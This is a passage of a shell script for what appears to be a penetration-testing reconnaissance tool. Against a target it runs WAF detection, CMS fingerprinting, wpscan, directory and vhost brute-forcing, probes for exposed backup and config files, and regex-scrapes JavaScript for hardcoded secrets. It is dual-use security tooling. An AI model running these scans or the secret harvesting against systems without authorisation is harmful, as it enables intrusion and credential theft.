  # Determine HTTP ports from scan results or common ones
  _http_ports=""
  if [ -n "$SERVICES_FILE" ] && [ -f "$SERVICES_FILE" ]; then
    _http_ports=$(grep -iE 'http|ssl/http|https' "$SERVICES_FILE" 2>/dev/null | grep -oE '^[0-9]+' | sort -u | tr '\n' ' ')
  elif [ -n "$OUTDIR" ] && [ -f "$OUTDIR/nmap_services.txt" ]; then
    _http_ports=$(grep -iE 'http|ssl/http|https' "$OUTDIR/nmap_services.txt" 2>/dev/null | grep -oE '^[0-9]+' | sort -u | tr '\n' ' ')
  fi
  if [ -z "$_http_ports" ]; then
    for _tp in 80 443 8080 8443 8000 3000 8888; do
      if nc -z -w 2 "$TARGET" "$_tp" 2>/dev/null; then
        _http_ports="$_http_ports $_tp"
      fi
    done
  fi

  if [ -z "$_http_ports" ]; then
    warn "No HTTP ports detected — skipping web enum"
    return
  fi

  info "HTTP ports found: $_http_ports"

  for _hp in $_http_ports; do
    _proto="http"
    case "$_hp" in 443|8443|*43) _proto="https" ;; esac
    _base="${_proto}://${TARGET}:${_hp}"

    section "WEB — $_base"

    # ── WAF detection ──
    if _has wafw00f; then
      info "WAF detection..."
      _waf=$(timeout -k 5s 20s wafw00f "$_base" 2>&1)
      _waf_status=$?
      if [ "$_waf_status" -eq 124 ] || [ "$_waf_status" -eq 137 ]; then
        warn "wafw00f timed out on $_base"
        _rec "[WARN] wafw00f timed out on $_base"
      elif [ "$_waf_status" -ne 0 ]; then
        warn "wafw00f failed on $_base (exit $_waf_status)"
        [ -n "$_waf" ] && emit "$_waf"
        _rec "[WARN] wafw00f failed on $_base (exit $_waf_status)"
      elif echo "$_waf" | grep -qi "is behind"; then
        _waf_name=$(echo "$_waf" | grep -i "is behind" | head -1)
        hi "WAF detected: $_waf_name"
        _rec "[INFO] WAF detected on $_base: $_waf_name — may need to adjust payloads"
      else
        info "No WAF detected"
      fi
    else
      warn "wafw00f not installed — WAF detection skipped"
      _rec "[WARN] WAF detection skipped on :$_hp (wafw00f missing)"
    fi

    # ── Headers + tech ──
    emit_raw "\n${W}--- Headers ---${N}"
    _headers=$(curl -skI -m 5 "$_base/" 2>/dev/null | tr -d '\r') || true
    if [ -n "$_headers" ]; then
      emit "$_headers"
      [ -n "$OUTDIR" ] && echo "$_headers" > "$OUTDIR/headers_${_hp}.txt"

      _server=$(echo "$_headers" | grep -i '^Server:' | head -1 | cut -d: -f2- | xargs)
      _powered=$(echo "$_headers" | grep -i '^X-Powered-By:' | head -1 | cut -d: -f2- | xargs)
      [ -n "$_server" ] && info "Server: $_server"
      [ -n "$_powered" ] && info "Powered by: $_powered"
      [ -n "$_server" ] && _rec "[ENUM] Web server on :$_hp → $_server — search for CVEs"
      [ -n "$_powered" ] && _rec "[ENUM] $_powered on :$_hp — search for CVEs"
    fi

    # ── SSL/TLS check ──
    if [ "$_proto" = "https" ] || [ "$_hp" = "443" ]; then
      if _has nmap; then
        info "SSL/TLS cipher check..."
        nmap --script ssl-enum-ciphers -p "$_hp" "$TARGET" 2>/dev/null | grep --line-buffered -E 'TLSv|SSLv|VULNERABLE|WARNING' | while IFS= read -r line; do
          emit "  $line"
        done
      fi
    fi

    # ── robots.txt + sitemap ──
    emit_raw "\n${W}--- robots.txt ---${N}"
    _robots=$(curl -sk -m 5 "$_base/robots.txt" 2>/dev/null) || true
    if echo "$_robots" | grep -qiE 'disallow|allow|sitemap'; then
      emit "$_robots"
      [ -n "$OUTDIR" ] && echo "$_robots" > "$OUTDIR/robots_${_hp}.txt"
      _rec "[ENUM] robots.txt found on :$_hp — review disallowed paths"
    else
      info "No robots.txt"
    fi

    _sitemap=$(curl -sk -m 5 "$_base/sitemap.xml" 2>/dev/null) || true
    if echo "$_sitemap" | grep -qi '<urlset\|<sitemapindex'; then
      info "sitemap.xml found"
      echo "$_sitemap" | grep -oE 'https?://[^<"]+' | head -20 | while read -r _su; do
        emit "  $_su"
      done
      [ -n "$OUTDIR" ] && echo "$_sitemap" > "$OUTDIR/sitemap_${_hp}.xml"
    fi

    # ── CMS detection ──
    emit_raw "\n${W}--- CMS detection ---${N}"
    _body=$(curl -sk -m 5 "$_base/" 2>/dev/null | head -100) || true
    _cms=""
    if echo "$_body" | grep -qi 'wp-content\|wp-includes\|wordpress'; then
      _cms="WordPress"
    elif echo "$_body" | grep -qi 'joomla'; then
      _cms="Joomla"
    elif echo "$_body" | grep -qi 'drupal'; then
      _cms="Drupal"
    elif echo "$_body" | grep -qi 'roundcube'; then
      _cms="Roundcube"
    elif [ -n "$_powered" ] && echo "$_powered" | grep -qi 'express'; then
      _cms="Express.js"
    fi

    if [ -n "$_cms" ]; then
      hi "CMS detected: $_cms"
      _rec "[ENUM] $_cms detected on :$_hp — search for known vulns and default creds"
      case "$_cms" in
        WordPress)
          if [ "$WORDLIST_COMPANION" -eq 1 ]; then
            info "wpscan delegated to the separate wordlist shell"
          elif [ "$FAST" -eq 0 ] && _has wpscan; then
            _wp_enum="vp,vt,u"
            [ "$MEDIUM" -eq 1 ] && _wp_enum="vp,u"
            info "Running wpscan..."
            _run_logged "WPScan on :$_hp" "${OUTDIR:+$OUTDIR/wpscan_${_hp}.txt}" \
              timeout -k 5s 60s wpscan --url "$_base" --enumerate "$_wp_enum" --no-banner
          elif [ "$FAST" -eq 1 ]; then
            info "wpscan skipped (--fast)"
          else
            warn "wpscan not installed — install for WordPress enum"
            _rec "[WARN] WordPress follow-up skipped on :$_hp (wpscan missing)"
          fi
          ;;
      esac
    else
      info "No common CMS detected"
    fi

    # ── Directory bruteforce ──
    if [ "$FAST" -eq 0 ] && [ "$WORDLIST_COMPANION" -eq 0 ]; then
      section "DIRECTORY SCAN — :$_hp"
      _dir_wordlist="$GOBUSTER_WORDLIST"
      [ "$MEDIUM" -eq 1 ] && _dir_wordlist="$GOBUSTER_MEDIUM_WORDLIST"
      _run_gobuster_directory "$_base" "$_hp" "$_dir_wordlist"
    fi

    # ── VHost discovery ──
    if [ "$FAST" -eq 0 ] && [ "$WORDLIST_COMPANION" -eq 0 ]; then
    section "VHOST SCAN — :$_hp"

    _vhost_wl=""
    _vhost_candidates="/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/namelist.txt
/usr/share/wordlists/amass/subdomains-top1mil-5000.txt"
    if [ "$MEDIUM" -eq 1 ]; then
      _vhost_candidates="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/wordlists/amass/subdomains-top1mil-5000.txt"
    fi
    for _vwl in $_vhost_candidates; do
      if [ -f "$_vwl" ]; then
        _vhost_wl="$_vwl"
        break
      fi
    done

    if [ -z "$_vhost_wl" ]; then
      warn "No subdomain wordlist — skipping VHost scan"
      _rec "[WARN] VHost scan skipped on :$_hp (subdomain wordlist missing)"
    else
      _run_ffuf_vhost "$_base" "$_hp" "$_vhost_wl"
    fi
    fi

    # ── Backup file probe ──
    emit_raw "\n${W}--- Backup file probe ---${N}"
    for _bpath in index.php index.html config.php wp-config.php .htaccess web.config; do
      for _bext in .bak .old .save "~" .swp .orig .dist .txt .zip; do
        _burl="$_base/${_bpath}${_bext}"
        _bcode=$(curl -sk -o /dev/null -w '%{http_code}' -m 3 "$_burl" 2>/dev/null) || true
        if [ "$_bcode" = "200" ]; then
          hi "BACKUP: $_burl (200 OK)"
          _rec "[ENUM] Backup file accessible: $_burl — download and review"
        fi
      done
    done

    # ── JS analysis ──
    emit_raw "\n${W}--- JavaScript endpoint extraction ---${N}"
    _jsfiles=$(curl -sk -m 5 "$_base/" 2>/dev/null | grep -oE 'src="[^"]*\.js"' | sed 's/src="//;s/"//' | head -10) || true
    if [ -n "$_jsfiles" ]; then
      echo "$_jsfiles" | while read -r _js; do
        case "$_js" in
          http*) _jsurl="$_js" ;;
          /*)    _jsurl="$_base$_js" ;;
          *)     _jsurl="$_base/$_js" ;;
        esac
        _jscontent=$(curl -sk -m 5 "$_jsurl" 2>/dev/null) || true
        _endpoints=$(echo "$_jscontent" | grep -oE '["'"'"'](/api/[^"'"'"']+|/v[0-9]/[^"'"'"']+)' | sort -u | head -10) || true
        _secrets=$(echo "$_jscontent" | grep -oiE '(api_key|apikey|token|secret|password|authorization)['"'"'"\s]*[:=]['"'"'"\s]*[a-zA-Z0-9+/=_-]{8,}' | head -5) || true
        if [ -n "$_endpoints" ]; then
          warn "Endpoints in $_js:"
          echo "$_endpoints" | while read -r _ep; do emit "  $_ep"; done
        fi
        if [ -n "$_secrets" ]; then
          hi "Secrets in $_js:"
          echo "$_secrets" | while read -r _sec; do emit "  $_sec"; done
          _rec "[PRIVESC] Hardcoded secrets found in $_js — review immediately"
        fi
      done
    fi

    # ── Parameter discovery ──
    if _has arjun && [ "$FAST" -eq 0 ] && [ "$WORDLIST_COMPANION" -eq 0 ]; then
      emit_raw "\n${W}--- Parameter discovery ---${N}"
      _arjun_limit=30
      [ "$MEDIUM" -eq 1 ] && _arjun_limit=15
      info "Running arjun on $_base (max ${_arjun_limit}s)..."
      _run_logged "Arjun on :$_hp" "" \
        timeout -k 5s "${_arjun_limit}s" arjun -u "$_base/" -q -t 10
    elif [ "$FAST" -eq 0 ] && [ "$WORDLIST_COMPANION" -eq 0 ]; then
      warn "arjun not installed — parameter discovery skipped"
      _rec "[WARN] Parameter discovery skipped on :$_hp (arjun missing)"
    fi

    # ── Nikto ──
    if _has nikto && [ "$FAST" -eq 0 ] && [ "$WORDLIST_COMPANION" -eq 0 ]; then
      section "NIKTO — :$_hp"
      _nikto_limit=60
      [ "$MEDIUM" -eq 1 ] && _nikto_limit=30
      info "Running nikto (max ${_nikto_limit}s)..."
      _run_logged "Nikto on :$_hp" "" \
        timeout -k 5s "${_nikto_limit}s" nikto -h "$_base" -nointeractive -maxtime "${_nikto_limit}s" -Tuning 123bde
    elif [ "$FAST" -eq 0 ] && [ "$WORDLIST_COMPANION" -eq 0 ]; then
      warn "nikto not installed — web vulnerability scan skipped"
      _rec "[WARN] Nikto scan skipped on :$_hp (nikto missing)"
    fi

  done

  info "Web enumeration completed ($(_elapsed))"
}

# ══════════════════════════════════════════════════════════════
#      TMUX LAYOUT — parallel wordlist panes
# ══════════════════════════════════════════════════════════════

_TMUX_WL_SESSION=""
_TMUX_WL_PANE_COUNT=0

_init_tmux_wordlists() {
  _TMUX_WL_SESSION="slrecon_wl_$$"
  _TMUX_WL_PANE_COUNT=0
  tmux kill-session -t "$_TMUX_WL_SESSION" 2>/dev/null || true
}

_start_tmux_wordlist_job() {
  _twj_key="$1"
  _twj_label="$2"
  _twj_port="$3"
  _twj_capture="$4"
  shift 4

  _twj_script="$_PW_TMP/${_twj_key}_run.sh"
  _twj_status_file="$_PW_TMP/${_twj_key}.status"
  _twj_internal_capture="$_PW_TMP/${_twj_key}_capture.txt"
  printf "%s\n" "$_twj_label" > "$_PW_TMP/${_twj_key}.label"
  : > "$_twj_internal_capture"

  # Build the command line with proper escaping
  _twj_cmdline=""
  for _twj_arg in "$@"; do
    case "$_twj_arg" in
      *[\ \'\"\\\$\`\*\?]*) _twj_cmdline="$_twj_cmdline '$(echo "$_twj_arg" | sed "s/'/'\\\\''/g")'" ;;
      *) _twj_cmdline="$_twj_cmdline $_twj_arg" ;;
    esac
  done

  # Build tee target: always capture internally, optionally to OUTDIR
  _twj_tee_target="$_twj_internal_capture"
  [ -n "$_twj_capture" ] && _twj_tee_target="$_twj_internal_capture $_twj_capture"

  cat > "$_twj_script" <<TWJEOF
#!/bin/sh
printf '\033[1;36m── $_twj_label ──\033[0m\n\n'
$_twj_cmdline 2>&1 | tee $_twj_tee_target
_rc=\$?
printf "%s\n" "\$_rc" > "$_twj_status_file"
if [ "\$_rc" -eq 0 ]; then
  printf '\n\033[1;32m[done] $_twj_label completato\033[0m\n'
elif [ "\$_rc" -eq 124 ] || [ "\$_rc" -eq 137 ]; then
  printf '\n\033[1;33m[!] $_twj_label timeout\033[0m\n'
else
  printf '\n\033[1;31m[x] $_twj_label fallito (exit %s)\033[0m\n' "\$_rc"
fi
sleep 8
TWJEOF
  chmod +x "$_twj_script"

  if [ "$_TMUX_WL_PANE_COUNT" -eq 0 ]; then
    tmux new-session -d -s "$_TMUX_WL_SESSION" \
      -x "$(tput cols 2>/dev/null || echo 120)" \
      -y "$(tput lines 2>/dev/null || echo 40)" \
      "sh '$_twj_script'"
    tmux set-option -t "$_TMUX_WL_SESSION" pane-border-status top 2>/dev/null || true
    tmux set-option -t "$_TMUX_WL_SESSION" pane-border-format " #{pane_title} " 2>/dev/null || true
    tmux select-pane -t "$_TMUX_WL_SESSION" -T "$_twj_label"
  else
    tmux split-window -t "$_TMUX_WL_SESSION" "sh '$_twj_script'"
    tmux select-pane -t "$_TMUX_WL_SESSION" -T "$_twj_label"
    tmux select-layout -t "$_TMUX_WL_SESSION" tiled 2>/dev/null || true
  fi

  _TMUX_WL_PANE_COUNT=$((_TMUX_WL_PANE_COUNT + 1))
  _PW_KEYS="$_PW_KEYS $_twj_key"
  _PW_COUNT=$((_PW_COUNT + 1))
  return 0
}

_wait_tmux_wordlist_jobs() {
  if [ "$_TMUX_WL_PANE_COUNT" -eq 0 ]; then
    return
  fi

  tmux select-layout -t "$_TMUX_WL_SESSION" tiled 2>/dev/null || true

  if [ -n "$TMUX" ]; then
    info "Wordlist scans in sessione tmux '$_TMUX_WL_SESSION'"
    info "Apri con: \033[1mCtrl+b w\033[0m → seleziona '$_TMUX_WL_SESSION'"
    info "Oppure: \033[1mCtrl+b :\033[0m → switch-client -t $_TMUX_WL_SESSION"
  else
    info "Wordlist scans in sessione tmux '$_TMUX_WL_SESSION'"
    info "Per vedere l'output live in un altro terminale:"
    info "  \033[1mtmux attach -t $_TMUX_WL_SESSION\033[0m"
  fi

  _tw_has_tty=0
  if [ -t 0 ] && [ -t 1 ]; then
    _tw_has_tty=1
    info "$_PW_COUNT scans in pane tmux — premi INVIO per fermare tutto"
  else
    info "$_PW_COUNT scans in pane tmux (attesa completamento)"
  fi

  _tw_elapsed=0
  while :; do
    _tw_active=0
    for _tw_key in $_PW_KEYS; do
      [ -f "$_PW_TMP/${_tw_key}.status" ] || _tw_active=$((_tw_active + 1))
    done
    [ "$_tw_active" -eq 0 ] && break

    _tw_enter=1
    if [ "$_tw_has_tty" -eq 1 ]; then
      if _has python3; then
        python3 -c 'import os,select,sys
fd=os.open("/dev/tty", os.O_RDONLY | os.O_NONBLOCK)
ready=select.select([fd], [], [], 1)[0]
sys.exit(0 if ready and os.read(fd, 1) else 1)'
        _tw_enter=$?
      else
        timeout --foreground 1s sh -c 'IFS= read -r _tw_key < /dev/tty'
        _tw_enter=$?
      fi
    fi
    if [ "$_tw_has_tty" -eq 1 ] && [ "$_tw_enter" -eq 0 ]; then
      tmux kill-session -t "$_TMUX_WL_SESSION" 2>/dev/null || true
      : > "$_PW_TMP/stopped"
      break
    else
      [ "$_tw_has_tty" -eq 1 ] || sleep 1
    fi
    _tw_elapsed=$((_tw_elapsed + 1))
    if [ $((_tw_elapsed % 15)) -eq 0 ]; then
      if [ "$_tw_has_tty" -eq 1 ]; then
        info "Wordlist scans attivi (${_tw_elapsed}s, $_tw_active in corso) — INVIO per fermare"
      else
        info "Wordlist scans attivi (${_tw_elapsed}s, $_tw_active in corso)"
      fi
    fi
  done

  tmux kill-session -t "$_TMUX_WL_SESSION" 2>/dev/null || true

  # Parse captured output for findings
  for _tw_key in $_PW_KEYS; do
    _tw_label=$(cat "$_PW_TMP/${_tw_key}.label" 2>/dev/null || echo "$_tw_key")
    _tw_capture="$_PW_TMP/${_tw_key}_capture.txt"
    if [ -f "$_tw_capture" ]; then
      while IFS= read -r _tw_line || [ -n "$_tw_line" ]; do
        [ -n "$_tw_line" ] || continue
        _tw_clean=$(printf "%s\n" "$_tw_line" | _strip_colors)
        case "$_tw_label" in
          ferox:*|gobuster:*)
            _tw_port=$(echo "$_tw_label" | cut -d: -f2)
            if echo "$_tw_clean" | grep -qE 'https?://|\(Status:[[:space:]]*[0-9]+'; then
              _rec "[ENUM] Directory finding on :$_tw_port → $_tw_clean"
            fi
            ;;
          vhost:*)
            _tw_port=$(echo "$_tw_label" | cut -d: -f2)
            case "$_tw_clean" in
              Terminated|Killed) : ;;
              *)
                if echo "$_tw_clean" | grep -qE 'Status:[[:space:]]*[0-9]+|^[A-Za-z0-9][A-Za-z0-9._-]*$'; then
                  _rec "[ENUM] VHost finding on :$_tw_port → $_tw_clean"
                fi
                ;;
            esac
            ;;
        esac
      done < "$_tw_capture"
    fi
  done
}

# ══════════════════════════════════════════════════════════════
#              PHASE — WORDLISTS ONLY
# ══════════════════════════════════════════════════════════════
phase_wordlists() {
  phase_hdr "WORDLIST SCANS"

  _http_ports="$WORDLIST_HTTP_PORTS"
  if [ -z "$_http_ports" ] && [ -n "$OUTDIR" ] && [ -f "$OUTDIR/nmap_services.txt" ]; then
    _http_ports=$(grep -iE 'http|ssl/http|https' "$OUTDIR/nmap_services.txt" 2>/dev/null | grep -oE '^[0-9]+' | sort -u | tr '\n' ' ')
  fi
  if [ -z "$_http_ports" ]; then
    info "Detecting HTTP ports on $TARGET..."
    for _tp in 80 443 8080 8443 8000 3000 8888; do
      if nc -z -w 2 "$TARGET" "$_tp" 2>/dev/null; then
        _http_ports="$_http_ports $_tp"
      fi
    done
  fi

  if [ -z "$_http_ports" ]; then
    warn "No HTTP ports detected — skipping wordlist scans"
    return
  fi

  info "HTTP ports: $_http_ports"

  _PW_TMP=$(mktemp -d 2>/dev/null || echo "/tmp/.slrecon_parallel_$$")
  if [ ! -d "$_PW_TMP" ]; then
    mkdir "$_PW_TMP" 2>/dev/null || {
      warn "Could not create parallel wordlist workspace"
      _rec "[WARN] Parallel wordlist scans failed (temporary directory unavailable)"
      return
    }
  fi
  _PW_KEYS=""
  _PW_WORKERS=""
  _PW_READERS=""
  _PW_COUNT=0
  _PW_STOPPED="$_PW_TMP/stopped"

  # Detect tmux for pane-based layout (detached session, no TTY needed)
  _USE_TMUX_WL=0
  if _has tmux; then
    _USE_TMUX_WL=1
    _init_tmux_wordlists
    info "tmux rilevato — gli scanner gireranno in pane separati"
  fi

  _start_wl_job() {
    if [ "$_USE_TMUX_WL" -eq 1 ]; then
      _start_tmux_wordlist_job "$@"
    else
      _start_parallel_wordlist_job "$@"
    fi
  }

  for _hp in $_http_ports; do
    _proto="http"
    case "$_hp" in 443|8443|*43) _proto="https" ;; esac
    _base="${_proto}://${TARGET}:${_hp}"

    section "PARALLEL WORDLIST SCANS — $_base"

    # The lightweight CMS probe is performed before the parallel group only to
    # decide whether WPScan is relevant.
    _body=$(curl -sk -m 5 "$_base/" 2>/dev/null) || true
    if echo "$_body" | grep -qi 'wp-content\|wp-includes\|wordpress'; then
      if _has wpscan; then
        info "Queueing WPScan on :$_hp"
        _start_wl_job "wpscan_${_hp}" "wpscan:${_hp}" "$_hp" \
          "${OUTDIR:+$OUTDIR/wpscan_${_hp}.txt}" \
          timeout -k 5s 60s wpscan --url "$_base" --enumerate vp,vt,u --no-banner
      else
        warn "wpscan not installed — WordPress scan skipped"
        _rec "[WARN] WordPress scan skipped on :$_hp (wpscan missing)"
      fi
    else
      info "WordPress not detected on :$_hp — WPScan not queued"
    fi

    # Feroxbuster is preferred for recursive content discovery. Gobuster stays
    # as a compatibility fallback when Feroxbuster is not installed.
    if [ ! -f "$GOBUSTER_WORDLIST" ]; then
      warn "Directory wordlist not found: $GOBUSTER_WORDLIST"
      _rec "[WARN] Directory scan skipped on :$_hp (wordlist missing)"
    elif _has feroxbuster; then
      info "Queueing Feroxbuster recursive scan on :$_hp (no time limit)"
      _fb_cal_size=$(_calibrate "$_base")
      _fb_extra=""
      if [ -n "$_fb_cal_size" ] && [ "$_fb_cal_size" -gt 0 ] 2>/dev/null; then
        _fb_extra="--filter-size $_fb_cal_size"
        info "Feroxbuster auto-filter: status 404, response size $_fb_cal_size"
      else
        info "Feroxbuster auto-filter: status 404"
      fi
      _start_wl_job "ferox_${_hp}" "ferox:${_hp}" "$_hp" \
        "${OUTDIR:+$OUTDIR/ferox_${_hp}.txt}" \
        feroxbuster -u "$_base" -w "$GOBUSTER_WORDLIST" -t 15 -d 2 -k --auto-tune -C 404 $_fb_extra
    elif _has gobuster; then
      warn "feroxbuster not installed — using Gobuster fallback"
      _rec "[INFO] Feroxbuster missing on :$_hp — Gobuster fallback used"
      _gb_cal_size=$(_calibrate "$_base")
      if [ -n "$_gb_cal_size" ]; then
        _start_wl_job "gobuster_${_hp}" "gobuster:${_hp}" "$_hp" \
          "${OUTDIR:+$OUTDIR/gobuster_${_hp}.txt}" \
          gobuster dir -u "$_base" -w "$GOBUSTER_WORDLIST" -t 15 --exclude-length "$_gb_cal_size"
      else
        _start_wl_job "gobuster_${_hp}" "gobuster:${_hp}" "$_hp" \
          "${OUTDIR:+$OUTDIR/gobuster_${_hp}.txt}" \
          gobuster dir -u "$_base" -w "$GOBUSTER_WORDLIST" -t 15
      fi
    else
      warn "feroxbuster and gobuster are missing — directory scan skipped"
      _rec "[WARN] Directory scan skipped on :$_hp (feroxbuster/gobuster missing)"
    fi

    _vhost_wl=""
    if [ -n "${SLRECON_VHOST_WORDLIST:-}" ] && [ -f "$SLRECON_VHOST_WORDLIST" ]; then
      _vhost_wl="$SLRECON_VHOST_WORDLIST"
    else
      for _vwl in /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
                  /usr/share/seclists/Discovery/DNS/namelist.txt \
                  /usr/share/wordlists/amass/subdomains-top1mil-5000.txt; do
        [ -f "$_vwl" ] && _vhost_wl="$_vwl" && break
      done
    fi

    if [ -z "$_vhost_wl" ]; then
      warn "No subdomain wordlist — skipping VHost scan"
      _rec "[WARN] VHost scan skipped on :$_hp (subdomain wordlist missing)"
    elif _has ffuf; then
      info "Queueing ffuf VHost scan on :$_hp with auto-calibration (no time limit)"
      _start_wl_job "vhost_${_hp}" "vhost:${_hp}" "$_hp" \
        "${OUTDIR:+$OUTDIR/ffuf_vhost_${_hp}.txt}" \
        ffuf -u "$_base/" -H "Host: FUZZ.$TARGET" -w "$_vhost_wl" \
          -ac -mc 200,302,301,401,403 -t 15 -c -s
    else
      warn "ffuf not installed — VHost scan skipped"
      _rec "[WARN] VHost scan skipped on :$_hp (ffuf missing)"
    fi

    if _has arjun; then
      info "Queueing Arjun parameter scan on :$_hp (max 30s)"
      _start_wl_job "arjun_${_hp}" "arjun:${_hp}" "$_hp" \
        "${OUTDIR:+$OUTDIR/arjun_${_hp}.txt}" \
        timeout -k 5s 30s arjun -u "$_base/" -q -t 10
    else
      warn "arjun not installed — parameter discovery skipped"
      _rec "[WARN] Parameter discovery skipped on :$_hp (arjun missing)"
    fi

    if _has nikto; then
      info "Queueing Nikto on :$_hp (max 60s)"
      _start_wl_job "nikto_${_hp}" "nikto:${_hp}" "$_hp" \
        "${OUTDIR:+$OUTDIR/nikto_${_hp}.txt}" \
        timeout -k 5s 60s nikto -h "$_base" -nointeractive -maxtime 60s -Tuning 123bde
    else
      warn "nikto not installed — web vulnerability scan skipped"
      _rec "[WARN] Nikto scan skipped on :$_hp (nikto missing)"
    fi

  done

  if [ "$_PW_COUNT" -eq 0 ]; then
    warn "No wordlist scanner could be started"
    _rec "[WARN] Wordlist phase completed without starting a scanner"
    rm -f "$_PW_TMP"/*.fifo "$_PW_TMP"/*.label 2>/dev/null || true
    rmdir "$_PW_TMP" 2>/dev/null || true
    return
  fi

  if [ "$_USE_TMUX_WL" -eq 1 ]; then
    # ── tmux pane mode: wait and parse ──
    _wait_tmux_wordlist_jobs
  else
    # ── FIFO pipe mode (original) ──
    _pw_has_tty=0
    if [ -t 0 ] && [ -t 1 ]; then
      _pw_has_tty=1
      info "$_PW_COUNT scans running concurrently — press ENTER to stop all and continue recon"
    else
      info "$_PW_COUNT scans running concurrently (no interactive TTY; waiting for completion)"
    fi

    _pw_elapsed=0
    while :; do
      _pw_active=0
      for _pw_key in $_PW_KEYS; do
        [ -f "$_PW_TMP/${_pw_key}.status" ] || _pw_active=$((_pw_active + 1))
      done
      [ "$_pw_active" -eq 0 ] && break

      _pw_enter=1
      if [ "$_pw_has_tty" -eq 1 ]; then
        if _has python3; then
          python3 -c 'import os,select,sys
fd=os.open("/dev/tty", os.O_RDONLY | os.O_NONBLOCK)
ready=select.select([fd], [], [], 1)[0]
sys.exit(0 if ready and os.read(fd, 1) else 1)'
          _pw_enter=$?
        else
          timeout --foreground 1s sh -c 'IFS= read -r _pw_key < /dev/tty'
          _pw_enter=$?
        fi
      fi
      if [ "$_pw_has_tty" -eq 1 ] && [ "$_pw_enter" -eq 0 ]; then
        : > "$_PW_STOPPED"
        for _pw_pid in $_PW_WORKERS; do
          kill -TERM "$_pw_pid" 2>/dev/null || true
        done
      else
        [ "$_pw_has_tty" -eq 1 ] || sleep 1
      fi
      _pw_elapsed=$((_pw_elapsed + 1))
      if [ $((_pw_elapsed % 10)) -eq 0 ]; then
        if [ "$_pw_has_tty" -eq 1 ]; then
          info "Parallel wordlist scans running (${_pw_elapsed}s, $_pw_active active) — press ENTER to stop all"
        else
          info "Parallel wordlist scans running (${_pw_elapsed}s, $_pw_active active)"
        fi
      fi
    done

    for _pw_pid in $_PW_WORKERS; do wait "$_pw_pid" 2>/dev/null || true; done
    for _pw_pid in $_PW_READERS; do wait "$_pw_pid" 2>/dev/null || true; done

    if [ -f "$_PW_STOPPED" ]; then
      warn "Parallel wordlist group stopped by user — continuing recon"
      _rec "[WARN] Parallel wordlist scans stopped by user before completion"
    fi
  fi

  # ── Status summary (both modes) ──
  for _pw_key in $_PW_KEYS; do
    _pw_label=$(cat "$_PW_TMP/${_pw_key}.label" 2>/dev/null || echo "$_pw_key")
    _pw_status=$(cat "$_PW_TMP/${_pw_key}.status" 2>/dev/null || echo 1)
    case "$_pw_status" in ''|*[!0-9]*) _pw_status=1 ;; esac
    if [ "$_pw_status" -eq 0 ]; then
      info "[$_pw_label] completed"
    elif [ -f "$_PW_STOPPED" ] && [ "$_pw_status" -eq 143 ]; then
      info "[$_pw_label] stopped by user"
    elif [ "$_pw_status" -eq 124 ] || [ "$_pw_status" -eq 137 ]; then
      warn "[$_pw_label] timed out"
      _rec "[WARN] $_pw_label timed out"
    else
      warn "[$_pw_label] failed (exit $_pw_status)"
      _rec "[WARN] $_pw_label failed (exit $_pw_status)"
    fi
  done

  rm -f "$_PW_TMP"/*.fifo "$_PW_TMP"/*.status "$_PW_TMP"/*.label "$_PW_TMP"/*_run.sh "$_PW_TMP"/*_capture.txt "$_PW_STOPPED" 2>/dev/null || true
  rmdir "$_PW_TMP" 2>/dev/null || true

  info "Wordlist scans completed ($(_elapsed))"
}

# Launch the wordlist-only phase in another terminal/shell. The worker writes
# its live output and recommendations into a private coordination directory;
# the main scan imports both before generating the final report.
_start_wordlist_companion() {
  WORDLIST_COMPANION_DIR=$(mktemp -d 2>/dev/null || echo "/tmp/.slrecon_wordlists_$$")
  if [ ! -d "$WORDLIST_COMPANION_DIR" ]; then
    mkdir "$WORDLIST_COMPANION_DIR" 2>/dev/null || {
      warn "Could not create wordlist companion directory — running wordlists in the main shell"
      return 1
    }
  fi

  _WLC_LOG="$WORDLIST_COMPANION_DIR/output.log"
  _WLC_RECS="$WORDLIST_COMPANION_DIR/recommendations.txt"
  _WLC_STATUS="$WORDLIST_COMPANION_DIR/status"
  _WLC_DONE="$WORDLIST_COMPANION_DIR/done"
  _WLC_STARTED="$WORDLIST_COMPANION_DIR/started"
  : > "$_WLC_LOG"

  _wlc_ports=""
  if [ -n "$SERVICES_FILE" ] && [ -f "$SERVICES_FILE" ]; then
    _wlc_ports=$(grep -iE 'http|ssl/http|https' "$SERVICES_FILE" 2>/dev/null | \
      grep -oE '^[0-9]+' | sort -u | tr '\n' ' ')
  fi

  _wlc_script=$(readlink -f "$0" 2>/dev/null || printf "%s" "$0")
  _wlc_code='
trap '\''[ -e "$6" ] || : > "$6"'\'' 0
: > "$7"
{
  sh "$1" "$2" --phase wordlists --wordlist-worker "$4" --wordlist-http-ports "$8"
  _worker_status=$?
  printf "%s\n" "$_worker_status" > "$5"
} 2>&1 | tee "$3"
'

  _wlc_launcher=""
  if [ -n "${TMUX:-}" ] && _has tmux; then
    tmux split-window -h sh -c "$_wlc_code" sh "$_wlc_script" "$TARGET" \
      "$_WLC_LOG" "$_WLC_RECS" "$_WLC_STATUS" "$_WLC_DONE" "$_WLC_STARTED" "$_wlc_ports" \
      >/dev/null 2>&1 &
    _wlc_launcher=$!
  elif _has wt.exe && _has wsl.exe; then
    if [ -n "${WSL_DISTRO_NAME:-}" ]; then
      wt.exe new-tab --title "SLRecon wordlists: $TARGET" wsl.exe -d "$WSL_DISTRO_NAME" -e \
        sh -c "$_wlc_code" sh "$_wlc_script" "$TARGET" "$_WLC_LOG" "$_WLC_RECS" \
        "$_WLC_STATUS" "$_WLC_DONE" "$_WLC_STARTED" "$_wlc_ports" >/dev/null 2>&1 &
    else
      wt.exe new-tab --title "SLRecon wordlists: $TARGET" wsl.exe -e \
        sh -c "$_wlc_code" sh "$_wlc_script" "$TARGET" "$_WLC_LOG" "$_WLC_RECS" \
        "$_WLC_STATUS" "$_WLC_DONE" "$_WLC_STARTED" "$_wlc_ports" >/dev/null 2>&1 &
    fi
    _wlc_launcher=$!
  elif _has gnome-terminal; then
    gnome-terminal --title="SLRecon wordlists: $TARGET" -- sh -c "$_wlc_code" sh \
      "$_wlc_script" "$TARGET" "$_WLC_LOG" "$_WLC_RECS" "$_WLC_STATUS" \
      "$_WLC_DONE" "$_WLC_STARTED" "$_wlc_ports" >/dev/null 2>&1 &
    _wlc_launcher=$!
  elif _has konsole; then
